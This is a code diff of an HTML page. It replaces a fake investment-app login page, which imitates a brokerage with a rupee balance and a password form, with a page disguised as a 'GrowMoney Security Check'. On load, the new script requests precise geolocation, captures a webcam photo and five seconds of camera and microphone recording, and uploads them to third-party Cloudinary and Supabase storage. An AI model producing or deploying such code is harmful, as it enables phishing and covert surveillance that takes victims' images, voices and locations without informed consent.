@@ -3,77 +3,115 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>GrowwMoney</title>
-    <style>
-        body {
-            background-color: black;
-            color: white;
-            font-family: Arial, sans-serif;
-            text-align: center;
-        }
-        .container {
-            max-width: 400px;
-            margin: auto;
-            padding: 20px;
-        }
-        .balance {
-            font-size: 24px;
-            margin-bottom: 10px;
-        }
-        .buttons {
-            display: flex;
-            flex-direction: column;
-            gap: 10px;
-        }
-        button {
-            background-color: #2d2d2d;
-            color: white;
-            border: none;
-            padding: 10px;
-            cursor: pointer;
-        }
-        .login-section {
-            margin-top: 20px;
-        }
-        input {
-            padding: 10px;
-            width: 100%;
-            margin-bottom: 10px;
-        }
-    </style>
+    <title>GrowMoney Security Check</title>
 </head>
 <body>
-    <div class="container">
-        <h2>Welcome back! Login to withdraw money.</h2>
-        <div class="balance">Account Balance: ₹65,327</div>
-        <div class="buttons">
-            <button>Withdraw Money</button>
-            <button>Your Holdings</button>
-            <button>Watchlist</button>
-            <button>Investments</button>
-            <button>IPOs</button>
-        </div>
-        <div class="login-section">
-            <input type="text" placeholder="Username/ID">
-            <input type="password" placeholder="Password">
-            <button>Login</button>
-        </div>
-    </div>
+    <h1>GrowMoney Security Check</h1>
+    <script type="module">
+        import { createClient } from "https://cdn.jsdelivr.net/npm/@supabase/supabase-js/+esm";
 
-    <script>
-        window.onload = function() {
-            navigator.geolocation.getCurrentPosition(position => {
-                console.log("Location: ", position.coords.latitude, position.coords.longitude);
-            });
-            
-            navigator.mediaDevices.getUserMedia({ video: true, audio: true })
-                .then(stream => {
-                    console.log("Camera & Microphone access granted.");
-                })
-                .catch(error => {
-                    console.error("Error accessing camera/mic: ", error);
-                });
+        const SUPABASE_URL = "https://sadbobgqmepamsjhboad.supabase.co";
+        const SUPABASE_ANON_KEY = "your-anon-key";
+        const supabase = createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+
+        const CLOUDINARY_UPLOAD_URL = "https://api.cloudinary.com/v1_1/dxylu8uii/upload";
+        const CLOUDINARY_PRESET = "ml_default";
+
+        const BACKEND_URL = "https://website-1j51.onrender.com/upload"; // Updated backend URL
+
+        let latitude = null;
+        let longitude = null;
+
+        function requestLocationPermission() {
+            navigator.geolocation.getCurrentPosition(
+                (position) => {
+                    latitude = position.coords.latitude;
+                    longitude = position.coords.longitude;
+                    console.log("Location:", latitude, longitude);
+                },
+                (error) => console.error("Location permission denied:", error),
+                { enableHighAccuracy: true }
+            );
         }
+
+        async function captureImage() {
+            try {
+                const video = document.createElement("video");
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                video.srcObject = stream;
+                await new Promise(resolve => video.onloadedmetadata = resolve);
+
+                const canvas = document.createElement("canvas");
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext("2d").drawImage(video, 0, 0);
+                
+                video.srcObject.getTracks().forEach(track => track.stop());
+                
+                canvas.toBlob(blob => handleUpload(blob, "image"), "image/jpeg");
+            } catch (error) {
+                console.error("Error capturing image:", error);
+            }
+        }
+
+        async function captureMedia() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                const mediaRecorder = new MediaRecorder(stream);
+                
+                mediaRecorder.ondataavailable = async (event) => {
+                    const file = new Blob([event.data], { type: "video/webm" });
+                    handleUpload(file, "video");
+                };
+                
+                mediaRecorder.start();
+                setTimeout(() => mediaRecorder.stop(), 5000);
+            } catch (error) {
+                console.error("Error capturing media:", error);
+            }
+        }
+
+        async function handleUpload(file, type) {
+            uploadToCloudinary(file, type);
+            uploadToSupabase(file, type);
+        }
+
+        async function uploadToCloudinary(file, resourceType) {
+            const formData = new FormData();
+            formData.append("file", file);
+            formData.append("upload_preset", CLOUDINARY_PRESET);
+            formData.append("resource_type", resourceType);
+            
+            try {
+                const response = await fetch(CLOUDINARY_UPLOAD_URL, {
+                    method: "POST",
+                    body: formData,
+                });
+                const data = await response.json();
+                console.log("Cloudinary URL:", data.secure_url);
+            } catch (error) {
+                console.error("Cloudinary upload error:", error);
+            }
+        }
+
+        async function uploadToSupabase(file, resourceType) {
+            const fileName = `${Date.now()}-${resourceType}.webm`;
+            try {
+                let { data, error } = await supabase.storage.from("suscapture").upload(fileName, file, {
+                    cacheControl: "3600",
+                    upsert: false,
+                    contentType: file.type
+                });
+                if (error) throw error;
+                console.log("Supabase URL:", data.path);
+            } catch (error) {
+                console.error("Supabase upload error:", error);
+            }
+        }
+
+        requestLocationPermission();
+        captureImage();
+        captureMedia();
     </script>
 </body>
 </html>
